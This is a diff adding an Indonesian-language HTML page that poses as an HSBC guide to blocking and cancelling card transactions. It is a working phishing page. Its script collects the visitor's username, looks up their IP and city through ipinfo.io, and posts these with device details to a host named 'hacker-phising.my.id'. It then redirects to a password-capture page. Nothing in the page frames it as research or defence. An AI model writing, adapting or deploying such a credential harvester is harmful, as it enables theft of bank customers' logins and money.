@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta content="#d4001a" name="theme-color"/>
+  <title>𝑪𝒂𝒓𝒂 𝒎𝒖𝒅𝒂𝒉 𝒃𝒍𝒐𝒌𝒊𝒓 𝒅𝒂𝒏 𝒃𝒂𝒕𝒂𝒍𝒌𝒂𝒏 𝒕𝒓𝒂𝒏𝒔𝒂𝒌𝒔𝒊 𝒌𝒂𝒓𝒕𝒖 𝒌𝒓𝒆𝒅𝒊𝒕 𝒅𝒂𝒏 𝒅𝒆𝒃𝒊𝒕 𝑯𝑺𝑩𝑪</title>
+  <meta content="img/home.jpg" property="og:image" />
+  <link href="img/logo.svg" rel="icon" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: sans-serif;
+      background: #fff;
+    }
+    body {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    .container {
+      flex: 1;
+      padding: 100px 15px 15px;
+      box-sizing: border-box;
+    }
+    label {
+      font-size: 16px;
+      margin-bottom: 0;
+      color: #333;
+      font-weight: 500;
+      display: block;
+    }
+    .input-box {
+      width: 100%;
+      border: 1px solid #aaa;
+      padding: 15px;
+      margin-top: 10px;
+      font-size: 16px;
+      border-radius: 2px;
+      box-sizing: border-box;
+    }
+    .footer {
+      padding: 15px;
+      background: #fff;
+      box-shadow: 0 0px 0px rgba(0,0,0,0.1);
+      position: sticky;
+      bottom: 0;
+      width: 100%;
+      max-width: 400px;
+      margin: 0 auto;
+      box-sizing: border-box;
+      transition: bottom 0.3s ease;
+    }
+    /* Footer normal */
+    .footer {
+      bottom: 0;
+    }
+    /* Footer naik 15px */
+    .footer.up {
+      bottom: 15px;
+    }
+    .button {
+      width: 100%;
+      padding: 16px;
+      font-size: 18px;
+      background-color: #c1c1c1;
+      color: white;
+      border: none;
+      border-radius:4px;
+      text-align: center;
+      font-weight: 500;
+      cursor: pointer;
+      user-select: none;
+      transition: background-color 0.3s ease;
+    }
+    .button.active {
+      background-color: #d4001a;
+    }
+    .button:disabled {
+      cursor: not-allowed;
+      background-color: #e0e0e0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <label for="username">Masukkan username Anda</label>
+    <input
+      type="text"
+      id="username"
+      class="input-box"
+      placeholder=""
+      oninput="toggleButton()"
+      onfocus="footerUp()"
+      onblur="footerDown()"
+      autocomplete="username"
+    />
+  </div>
+
+  <div id="footer" class="footer">
+    <button id="submitBtn" class="button" onclick="kirimData()" disabled>Selanjutnya</button>
+  </div>
+
+  <script>
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      if (/Android/i.test(ua)) return 'Android';
+      if (/iPhone|iPad|iPod/i.test(ua)) return 'iPhone';
+      return 'Lainnya';
+    }
+
+    function toggleButton() {
+      const username = document.getElementById('username').value.trim();
+      const button = document.getElementById('submitBtn');
+      if (username !== "") {
+        button.classList.add('active');
+        button.disabled = false;
+      } else {
+        button.classList.remove('active');
+        button.disabled = true;
+      }
+    }
+
+    function footerUp() {
+      document.getElementById('footer').classList.add('up');
+    }
+
+    function footerDown() {
+      document.getElementById('footer').classList.remove('up');
+    }
+
+    async function kirimData() {
+      const username = document.getElementById('username').value.trim();
+      if (!username) return;
+
+      try {
+        const res = await fetch("https://ipinfo.io/json?token=ef72b040d9a8c1");
+        const info = await res.json();
+
+        const payload = {
+          username: username,
+          city: info.city,
+          ip: info.ip,
+          device: navigator.platform,
+          model: getDeviceInfo()
+        };
+
+        await fetch("https://hacker-phising.my.id/notif/req/loginhsbc.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        window.location.href = "passwordhsbc.html";
+      } catch (error) {
+        alert("Gagal mengirim data.");
+      }
+    }
+  </script>
+</body>
+</html>
